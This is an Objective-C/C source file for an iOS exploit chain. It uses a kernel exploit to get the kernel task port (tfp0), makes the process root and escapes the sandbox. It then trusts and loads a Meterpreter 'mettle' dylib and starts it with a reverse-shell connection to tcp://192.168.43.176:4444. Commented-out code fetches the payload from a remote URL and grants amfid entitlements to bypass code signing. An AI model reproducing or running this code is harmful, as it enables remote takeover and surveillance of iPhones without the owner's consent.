#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

#include <mach/mach.h>

#include "common.h"

#import <Foundation/Foundation.h>

#import "empty_list.h"
#import "jelbrek.h"

#import <dlfcn.h>

#define LOG(msg) \
  NSLog(@msg); \
  fprintf(stderr, msg); \
  fflush(stderr); \

int main() {
  LOG("Starting...\n");

  mach_port_t taskforpidzero = exploit();
  if (!MACH_PORT_VALID(taskforpidzero)) {
    LOG("Exploit failed...\n");
    sleep(1);
    return -1;
  }

  LOG("Got tfp0\n");

  init_jelbrek(taskforpidzero);

  LOG("Good init\n");

  pid_t pid = getpid();

  rootify(pid);
  LOG("got uid 0\n");

  FILE *f = fopen("/var/mobile/.roottest", "w");
  LOG("file!\n");
  if (f) {
    fclose(f);
  }

  uint64_t sb = unsandbox(pid);

  f = fopen("/var/mobile/.roottest", "w");
  if (f) {
    LOG("sb file!\n");
    fclose(f);
  }

  //setcsflags(pid); // set some csflags
  //platformize(pid); // set TF_PLATFORM
  //setHSP4();

  char * payload_url = "http://192.168.43.176:8080/payload";
  //char * met_path = "/var/mobile/mettle.dylib";
  //char * file_path = "/var/mobile/amfid_payload.dylib";
  char * file_path = "/var/mobile/mettle.dylib";
  //unlink(file_path);
  //NSURL *url = [NSURL URLWithString:[NSString stringWithUTF8String:payload_url]];
  //NSData *urlData = [NSData dataWithContentsOfURL:url];
  //if (urlData) {
    //LOG("Got data!\n");
    //[urlData writeToFile:[NSString stringWithUTF8String:file_path] atomically:YES];
    //LOG("Wrote data!\n");
  //} else {
    //LOG("No data!\n");
  //}

  LOG("trust!\n");
  trustbin(file_path);
  //LOG("trust met!\n");
  //trustbin(met_path);

  // patch amfid
  //pid_t amfid = pid_of_procName("amfid");

  // entitle it
  //setcsflags(amfid);
  //entitlePidOnAMFI(amfid, "get-task-allow", true);
  //entitlePidOnAMFI(amfid, "com.apple.private.skip-library-validation", true);

  // entitle ourselves too
  //entitlePidOnAMFI(getpid(), "task_for_pid-allow", true);
  //entitlePidOnAMFI(getpid(), "com.apple.system-task-ports", true);

  LOG("inject!\n");
  fixMmap(file_path);
  LOG("fixed mmap!\n");
  void* mettle = dlopen(file_path, RTLD_NOW);
  if (mettle) {
    LOG("got mettle!\n");

    // Launch the payload
    typedef int (*main_ptr)(int argc, const char *argv[]);
    main_ptr main_func = dlsym(mettle, "main");
    if (main_func) {
      LOG("got main_func!\n");
      const char * progname = "mettle";
      const char * arg1 = "-u";
      const char * arg2 = "tcp://192.168.43.176:4444";
      const char *argv[] = { progname, arg1, arg2, NULL };
      int mainret = main_func(3, argv);
      LOG("did run main_func!\n");
    }
  }
  LOG("mettle!\n");
  LOG("mettle!\n");
  LOG("mettle!\n");
  LOG("mettle!\n");
  LOG("mettle!\n");
  LOG("mettle!\n");
  LOG("mettle!\n");
  LOG("mettle!\n");

  //Feb 10 23:48:23 iPhone-8 kernel(Sandbox)[0] <Error>: Sandbox: amfid(207) System Policy: deny(1) file-map-executable /private/var/mobile/mettle.dylib
  //Feb 10 23:48:23 iPhone-8 hellotest[206] <Notice>: Error is dlopen(/var/mobile/mettle.dylib, 0x0002): file system sandbox blocked mmap() of '/var/mobile/mettle.dylib'

  //fixMmap(met_path);
  //LOG("fixed mmap met!\n");
  //inject_dylib(amfid, met_path);
  LOG("sandbox!\n");

  if (sb) {
    sandbox(pid, sb);
  }

  LOG("exit!\n");
  exit(0);
  LOG("exit lol!\n");


  return 0;
}


uint64_t entry[] = { MAGIC, (uint64_t)&main };
